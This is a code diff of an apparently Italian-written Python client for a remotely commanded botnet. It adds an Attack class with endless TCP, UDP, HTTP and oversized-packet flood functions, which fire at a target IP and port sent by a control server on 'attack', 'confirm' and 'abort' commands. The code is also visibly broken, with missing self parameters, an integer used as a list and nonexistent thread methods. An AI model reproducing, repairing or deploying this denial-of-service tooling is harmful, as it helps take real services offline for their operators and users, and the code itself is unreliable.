@@ -1,62 +1,46 @@
-import socket
 import threading
+import requests
+import socket
 
 # Dati target
 TYPE, IP, PORT, THREADS, METHOD = "", "", 0, 0, ""
 
 THREADS_LIST = []
 
-class ThreadManager:
-    def __init__(self):
-        self.threads = []
-
-    def create_thread(self, target, args=()):
-        thread = CustomThread(target=target, args=args)
-        self.threads.append(thread)
-        thread.start()
-        return thread
-
-    def abort_all_threads(self):
-        for thread in self.threads:
-            thread.abort()
-
-    def join_all_threads(self):
-        for thread in self.threads:
-            thread.join()
-
-    def remove_thread(self, thread):
-        if thread in self.threads:
-            self.threads.remove(thread)
-
-    def clear_threads(self):
-        self.threads = []
-
-class CustomThread(threading.Thread):
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-        self._abort = threading.Event()
-
-    def abort(self):
-        self._abort.set()
-
-    def run(self):
-        while not self._abort.is_set():
-            # Esegui il codice del thread qui
-            pass  # Sostituisci con il tuo codice
-
-
 class Attack:
-    
-    tm = ThreadManager.__init__()
     
     def init():
         if METHOD == "TCP_FLOOD":
             threads = int(THREADS)
             for i in range(threads):
-                
+                thread = threading.Thread(target=tcp_flood) # type: ignore
+                THREADS.append(thread)
+
+    def abort():
+        for thread in THREADS:
+            thread.abort()
+    def confirm():
+        for thread in THREADS:
+            thread.run()
     
-    def TCP_FLOOD():
-        pass
+    def tcp_flood():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, PORT))
+            s.send(b"GET / HTTP/1.1\r\nHost: %^&((*&)%$^%$^$%&*()F^T^&T%R&^T*FIG%&TF^UGYYGH56438794536879\r\n\r\n")
+            s.close()
+    def udp_flood():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(b"A" * 1024, (IP, PORT))
+    def http_flood():
+        while True:
+            requests.get(f"{IP}:{PORT}")
+    def bigPacket():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(b"A" * 65535, (IP, PORT))
+    
 
 # Funzione per gestire i messaggi dal server
 def receive_messages_from_server(client_socket):
@@ -74,18 +58,13 @@ def receive_messages_from_server(client_socket):
         if TYPE == "attack":
             
             TYPE, IP, PORT, THREADS, METHOD = message.split(" ")
-            
-            print(f"""
-                Dati attacco:
-                IP: {IP}
-                PORT: {PORT}
-                NUMERO THREADS: {THREADS}
-                METODO: {METHOD}
-                """)
+            Attack.init()
         elif TYPE == "confirm":
-            print("confirm") # TODO ingaggiare l'attacco
+            print("Confermare l'attacco")
+            Attack.confirm()
         elif TYPE ==  "abort":
             print("Terminating attack.")
+            Attack.abort()
         else:
             pass
 
